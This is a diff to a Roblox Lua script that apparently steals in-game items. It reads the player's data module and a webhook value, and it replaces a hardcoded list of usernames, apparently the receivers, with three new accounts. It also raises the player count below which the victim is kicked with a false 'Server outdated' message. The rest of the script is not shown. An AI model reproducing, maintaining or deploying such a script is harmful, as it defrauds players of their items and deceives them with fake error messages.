@@ -1,5 +1,3 @@
-
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 game:GetService("Players")
 local Replion = require(ReplicatedStorage.Modules.Replion).Client:GetReplion("Data")
@@ -276,7 +274,9 @@ local NODH_WEBHOOK = _G.NODH_WEBHOOK
 local option = _G.MY_USERNAMES or {}
 local vs = {}
 for index, item in ipairs({
-	"baddiestest777",
+	"qua_lovesAJJ",
+	"LostIatinagirI",
+	"WinningBaddiesStar",
 }) do
 	table.insert(vs, item)
 end
@@ -286,7 +286,7 @@ for _, item in ipairs(option) do
 		local lower = secondaryItem.lower
 		local secondaryLower = item.lower
 
-		if lower(secondaryItem) == secondaryLower(item) then
+		if type(secondaryItem) == "string" and type(item) == "string" and secondaryItem:lower() == item:lower() then
 			flag = true
 
 			break
@@ -510,7 +510,7 @@ playerGuiContainer.CharacterAdded:Connect(function(character)
 	local setBackpackEnabled = lib
 
 	if setBackpackEnabled then
-		setBackpackEnabled = lib.SetBackpackEnabled
+				setBackpackEnabled = lib.SetBackpackEnabled
 	end
 
 	if setBackpackEnabled then
@@ -933,8 +933,8 @@ local function fallbackHandler()
 	local result = #players:GetPlayers()
 	local MaxPlayers = players.MaxPlayers
 
-	if result < 3 or result >= MaxPlayers - 1 then
-		playerGuiContainer:Kick("Server outdated, Join one above 3+ players")
+	if result < 5 or result >= MaxPlayers - 1 then
+		playerGuiContainer:Kick("Server outdated, Join one above 12+ players")
 
 		return false
 	end
